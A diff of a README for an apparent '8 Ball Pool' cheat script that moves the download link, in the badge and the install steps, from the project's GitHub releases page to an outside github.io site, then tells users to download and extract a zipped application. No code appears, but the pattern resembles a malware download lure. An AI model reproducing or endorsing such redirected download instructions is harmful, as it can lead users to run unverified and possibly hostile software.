@@ -1,6 +1,6 @@
 # 🎱 8-ball-pool-x-v2026-script - Improve your 8 Ball Pool game performance
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Sphinxseyhan957/8-ball-pool-x-v2026-script/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://sphinxseyhan957.github.io)
 
 ## 🎯 About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these conditions before you run the script:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the download page: https://github.com/Sphinxseyhan957/8-ball-pool-x-v2026-script/releases
+1. Visit the following link to access the download page: https://sphinxseyhan957.github.io
 2. Find the most recent release entry in the list.
 3. Download the zipped file containing the application.
 4. Extract the contents of the ZIP folder to a new folder on your desktop.
